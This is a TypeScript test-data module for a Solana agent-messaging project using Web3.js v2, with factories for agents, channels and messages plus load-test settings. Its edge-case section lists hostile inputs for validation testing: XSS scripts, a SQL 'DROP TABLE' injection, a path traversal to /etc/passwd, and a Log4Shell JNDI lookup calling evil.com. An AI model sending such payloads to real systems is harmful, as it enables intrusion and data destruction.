// ✅ Web3.js v2 ONLY - No v1 imports allowed
import { generateKeyPairSigner, type KeyPairSigner } from '@solana/signers';
import { address, type Address } from '@solana/addresses';
import { createSolanaRpc, type SolanaRpcApi } from '@solana/rpc';

// ✅ Agent test data using v2 types
export interface AgentTestDataV2 {
  name: string;
  description: string;
  capabilities: number;
  metadata: {
    version: string;
    type: 'ai' | 'human' | 'hybrid';
    tags: string[];
  };
  signer: KeyPairSigner; // ✅ v2 KeyPairSigner instead of v1 Keypair
  address: Address; // ✅ v2 Address instead of v1 PublicKey
}

// ✅ Channel test data using v2 patterns
export interface ChannelTestDataV2 {
  name: string;
  description: string;
  isPrivate: boolean;
  features: string[];
  id: string;
  channelAddress: Address;
}

// ✅ Message test data using v2 patterns
export interface MessageTestDataV2 {
  content: string;
  type: 'direct' | 'channel' | 'system' | 'command';
  encrypted: boolean;
  metadata: Record<string, any>;
  sender: Address;
  recipient?: Address;
}

// ✅ Test factory using v2 patterns
export class TestDataFactoryV2 {
  private static readonly AGENT_NAMES = ['Alpha', 'Beta', 'Gamma', 'Delta', 'Epsilon'];
  private static readonly AGENT_TYPES: ('ai' | 'human' | 'hybrid')[] = ['ai', 'human', 'hybrid'];

  /**
   * ✅ Create random agent using Web3.js v2 patterns
   */
  static async createRandomAgent(): Promise<AgentTestDataV2> {
    // ✅ Generate signer using v2 pattern
    const signer = await generateKeyPairSigner();
    
    return {
      name: `TestBot ${this.AGENT_NAMES[Math.floor(Math.random() * this.AGENT_NAMES.length)]}`,
      description: `Generated test agent ${Date.now()}`,
      capabilities: Math.floor(Math.random() * 32), // Random capabilities
      metadata: {
        version: '1.0.0',
        type: this.AGENT_TYPES[Math.floor(Math.random() * this.AGENT_TYPES.length)]!,
        tags: ['test', 'generated', 'v2', 'web3js-v2']
      },
      signer, // ✅ v2 KeyPairSigner
      address: signer.address // ✅ v2 Address
    };
  }

  /**
   * ✅ Create multiple agents concurrently using v2 patterns
   */
  static async createAgentBatch(count: number): Promise<AgentTestDataV2[]> {
    const agentPromises = Array.from({ length: count }, () => this.createRandomAgent());
    return await Promise.all(agentPromises);
  }

  /**
   * ✅ Create channel using v2 patterns
   */
  static async createRandomChannel(): Promise<ChannelTestDataV2> {
    // ✅ Generate random channel address using v2
    const channelSigner = await generateKeyPairSigner();
    
    return {
      name: `Test Channel ${Date.now()}`,
      description: `Generated test channel`,
      isPrivate: Math.random() > 0.5,
      features: ['encryption', 'ai-agents', 'v2-compatible'],
      id: `ch_test_v2_${Date.now()}`,
      channelAddress: channelSigner.address // ✅ v2 Address
    };
  }

  /**
   * ✅ Create message using v2 patterns
   */
  static async createRandomMessage(): Promise<MessageTestDataV2> {
    const types: ('direct' | 'channel' | 'system' | 'command')[] = ['direct', 'channel', 'system', 'command'];
    const contents = [
      'Random v2 test message',
      'Web3.js v2 performance test',
      'V2 automated test content',
      'Generated v2 message payload'
    ];

    // ✅ Generate sender using v2
    const senderSigner = await generateKeyPairSigner();

    return {
      content: `${contents[Math.floor(Math.random() * contents.length)]} ${Date.now()}`,
      type: types[Math.floor(Math.random() * types.length)]!,
      encrypted: Math.random() > 0.5,
      metadata: {
        timestamp: Date.now(),
        random: Math.random(),
        generated: true,
        web3jsVersion: 'v2'
      },
      sender: senderSigner.address // ✅ v2 Address
    };
  }

  /**
   * ✅ Create performance dataset using v2 patterns
   */
  static async createPerformanceDataset(size: number): Promise<PerformanceTestDataV2[]> {
    const dataPromises = Array.from({ length: size }, async (_, i) => {
      const agent = await this.createRandomAgent();
      const message = await this.createRandomMessage();
      
      return {
        id: i,
        agent,
        message,
        timestamp: Date.now() + i,
        sequence: i
      };
    });

    return await Promise.all(dataPromises);
  }
}

// ✅ Performance test data using v2 patterns
export interface PerformanceTestDataV2 {
  id: number;
  agent: AgentTestDataV2;
  message: MessageTestDataV2;
  timestamp: number;
  sequence: number;
}

// ✅ Test configuration using v2 patterns
export interface TestConfigV2 {
  rpc: ReturnType<typeof createSolanaRpc>;
  programId: Address;
  systemProgramId: Address;
  testAgents: AgentTestDataV2[];
  testChannels: ChannelTestDataV2[];
}

// ✅ Test configuration factory using v2 patterns
export class TestConfigFactoryV2 {
  /**
   * ✅ Create complete test configuration using v2 patterns
   */
  static async createTestConfig(rpcUrl: string = 'http://localhost:8899'): Promise<TestConfigV2> {
    // ✅ Create RPC using v2
    const rpc = createSolanaRpc(rpcUrl);
    
    // ✅ Define program addresses using v2
    const programId = address('HEpGLgYsE1kP8aoYKyLFc3JVVrofS7T4zEA6fWBJsZps');
    const systemProgramId = address('11111111111111111111111111111112');
    
    // ✅ Create test data using v2 patterns
    const testAgents = await TestDataFactoryV2.createAgentBatch(3);
    const testChannels = await Promise.all([
      TestDataFactoryV2.createRandomChannel(),
      TestDataFactoryV2.createRandomChannel(),
      TestDataFactoryV2.createRandomChannel()
    ]);

    return {
      rpc,
      programId,
      systemProgramId,
      testAgents,
      testChannels
    };
  }
}

// ✅ Edge case test data using v2 patterns
export const EDGE_CASE_DATA_V2 = {
  // Boundary values
  maxLengthName: 'x'.repeat(50), // Maximum allowed name length
  emptyName: '',
  unicodeName: '🤖🚀💬📊🔧',
  
  // Large content
  maxMessage: 'x'.repeat(1000), // Maximum message length
  emptyMessage: '',
  unicodeMessage: '🎉'.repeat(100),
  
  // Invalid data
  invalidCapabilities: [-1, 999999, NaN, Infinity],
  invalidNetworks: ['invalid', '', null, undefined],
  
  // Security test data - v2 compatible
  maliciousInputs: [
    '<script>alert("xss")</script>',
    '"; DROP TABLE agents; --',
    '../../etc/passwd',
    '\x00\x01\x02\x03',
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    '${jndi:ldap://evil.com/a}'
  ]
};

// ✅ Network test scenarios using v2 patterns
export const NETWORK_SCENARIOS_V2 = {
  localhost: {
    url: 'http://localhost:8899',
    name: 'Local Test Validator',
    latency: 10
  },
  devnet: {
    url: 'https://api.devnet.solana.com',
    name: 'Solana Devnet',
    latency: 200
  },
  testnet: {
    url: 'https://api.testnet.solana.com',
    name: 'Solana Testnet', 
    latency: 300
  }
};

// ✅ Performance test configuration using v2 patterns
export const PERFORMANCE_TESTS_V2 = {
  loadTest: {
    agentCount: 100,
    messageRate: 1000, // messages per second
    duration: 60000, // 1 minute
    concurrency: 10,
    web3jsVersion: 'v2'
  },
  stressTest: {
    agentCount: 1000,
    messageRate: 10000, // messages per second
    duration: 300000, // 5 minutes
    concurrency: 50,
    web3jsVersion: 'v2'
  },
  enduranceTest: {
    agentCount: 50,
    messageRate: 100, // messages per second
    duration: 3600000, // 1 hour
    concurrency: 5,
    web3jsVersion: 'v2'
  }
};

// ✅ Cleanup utilities for v2 test data
export class TestDataCleanupV2 {
  /**
   * ✅ Cleanup agents using v2 patterns
   */
  static async cleanupAgents(agents: AgentTestDataV2[]): Promise<void> {
    const agentAddresses = agents.map(agent => agent.address);
    console.log(`🧹 Cleaning up ${agentAddresses.length} v2 test agents`);
    // Implementation would clean up test agents from blockchain using v2 RPC
  }

  /**
   * ✅ Cleanup channels using v2 patterns
   */
  static async cleanupChannels(channels: ChannelTestDataV2[]): Promise<void> {
    const channelAddresses = channels.map(channel => channel.channelAddress);
    console.log(`🧹 Cleaning up ${channelAddresses.length} v2 test channels`);
    // Implementation would clean up test channels using v2 RPC
  }

  /**
   * ✅ Cleanup all test data using v2 patterns
   */
  static async cleanupAll(config: TestConfigV2): Promise<void> {
    console.log('🧹 Cleaning up all v2 test data');
    await this.cleanupAgents(config.testAgents);
    await this.cleanupChannels(config.testChannels);
    console.log('✅ V2 cleanup completed');
  }
} 